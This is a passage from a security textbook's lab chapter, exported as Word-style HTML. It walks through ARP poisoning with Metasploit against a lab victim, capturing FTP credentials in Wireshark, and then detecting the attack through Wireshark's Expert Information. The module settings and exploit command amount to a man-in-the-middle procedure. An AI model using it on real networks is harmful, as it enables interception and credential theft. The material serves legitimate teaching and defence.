;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Target</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=183  valign=top  style="width:110.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >vic1</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=193  valign=top  style="width:116.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >192.100.200.</span><i><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-style:italic;font-size:15.0000pt;" >193</span></i><i><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></p></td><td width=71  valign=top  style="width:43.1500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:none;mso-border-right-alt:none;border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >3a:fb:</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:38.7500pt;" ><td width=130  valign=top  style="width:78.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >SHOSTS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=200  valign=top  style="width:120.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:43.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Spoofed IP address</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=183  valign=top  style="width:110.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >the Gateway</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=193  valign=top  style="width:116.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >192.100.200.1</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=71  valign=top  style="width:43.1500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:none;mso-border-right-alt:none;border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:-1.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >00:00</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:38.7500pt;" ><td width=130  valign=top  style="width:78.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >LOCALSIP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=200  valign=top  style="width:120.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Local IP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=183  valign=top  style="width:110.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:1.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Kali/Metasploit (you)</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=193  valign=top  style="width:116.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >192.100.200.</span><i><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-style:italic;font-size:15.0000pt;" >192</span></i><i><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></p></td><td width=71  valign=top  style="width:43.1500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:none;mso-border-right-alt:none;border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >c6:2c:</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:9.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The IP addresses you see might be different in your Lab instance. Always check the IP addresses of the needed systems in your own live Lab&#8212;don&#8217;t rely on this example.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At the msf console prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >set DHOSTS x.x.x.x</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, replacing x with the IP address of your target. This is the target system you are</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section200" ><p class=MsoBodyText  style="margin-top:4.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >sending the ARP packets to.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Then, at the msf console prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >set SHOSTS x.x.x.x</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, replacing x with the IP address of the gateway. This is because you want the target to associate the gateway interface with </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >your </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >MAC address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.1000pt;" ><a name="_bookmark389" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With the final setting, at the msf console prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >set LOCALSIP x.x.x.x</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, replacing x with our system&#8217;s IP address. Without this step, the lab may fault with the error &#8220;LOCALSIP is not an ipv4 address,&#8221; as shown in<a name="_bookmark390" ></a>&nbsp;</span><span><a href="#_bookmark391" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="253.75"  height="0" ></td></tr><tr><td></td><td><img width="513"  height="355"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker260452.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark391" ></a><span><a href="#_bookmark390" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >LOCALSIP</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, to run the exploit, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exploit </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at the msf console, as shown in<a name="_bookmark392" ></a>&nbsp;</span><span><a href="#_bookmark393" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. And don&#8217;t forget about starting Wireshark!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section201" ><p class=MsoBodyText  style="margin-left:30.5000pt;" ><img width="705"  height="313"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker260669.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark393" ></a><span><a href="#_bookmark392" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Exploit in progress</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Wireshark for Capturing</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Did you remember to start Wireshark? In this case, it&#8217;s not a problem if you start it now. Launch Wireshark either by choosing it from the applications folder in Kali or by double-clicking on the Kali icon on the W4SP Lab network diagram. As you see the packets scrolling up, you&#8217;ll want to enter a display filter to present only the ARP packets. As shown in<a name="_bookmark394" ></a>&nbsp;</span><span><a href="#_bookmark395" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you can see your attacking machine&#8217;s MAC address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section202" ><p class=MsoBodyText ><img width="779"  height="449"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker261214.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark395" ></a><span><a href="#_bookmark394" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >ARP packets fly</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:13.3500pt;" ><a name="_bookmark396" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can verify that ARP poisoning is working by sniffing from the host. If you have targeted a victim, you will eventually see traffic from it destined to the default gateway. For example, when vic1 attempts to make an FTP connection to the ftp2 machine, you will be able to capture that traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Rerouted FTP</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;letter-spacing:-1.0500pt;font-weight:bold;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Credentials</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark397" ></a>&nbsp;</span><span><a href="#_bookmark398" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the target system (vic1) is attempting to establish a session with an FTP server on a different subnet (10.100.200.x), beginning with the FTP credentials. Normally, these packets would first route to the next hop. In </span><span><a href="#_bookmark398" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, however, you see it is our system&#8217;s MAC address, not the gateway&#8217;s MAC address, the packets are sent to. Success! The FTP username and password</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are sent in the clear as expected. Given our ARP poisoning attack was successful, any traffic that would be routed out of the subnet is now sent directly to your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section203" ><p class=MsoBodyText ><img width="782"  height="450"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker262231.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark398" ></a><span><a href="#_bookmark397" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >FTP credentials to attacker</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At this point, as an attacker, you have options for what&#8217;s next. Maybe you would route the traffic through a tunnel to its expected destination, to keep operations going. Or, because all you wanted was the credentials, you&#8217;ll re-poison the target machine with the correct MAC for the gateway. Or do nothing, allowing the ARP cache to grow stale and the router will be found again.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Wireshark Detecting an ARP MitM Attack</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><a name="_bookmark399" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A great feature of Wireshark, for this and most any scenario, is the Expert Information, which is found under the Analyze menu pull- down. Here Wireshark flags Errors, Warnings, Notes, and Chats (in varying severities). Each of these items can be expanded or collapsed, listing which packets contributed to the item. In our case, Wireshark warns us of a duplicate IP address. The packets listed are the gratuitous ARP announcements from our attacking machine. The listed packets show our MAC address (see<a name="_bookmark400" ></a>&nbsp;</span><span><a href="#_bookmark401" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-9</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section204" ><p class=MsoBodyText  style="margin-left:66.5000pt;" ><img width="587"  height="525"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker263277.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark401" ></a><span><a href="#_bookmark400" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Expert information</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><a name="_bookmark402" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To investigate, look at the switch tables to find out what port number the malicious ARP poison packets originated from. (Knowing the switch port number can lead to the physical machine/user.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >W4SP Lab: Performing a DNS MitM Attack</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this section, we perform a 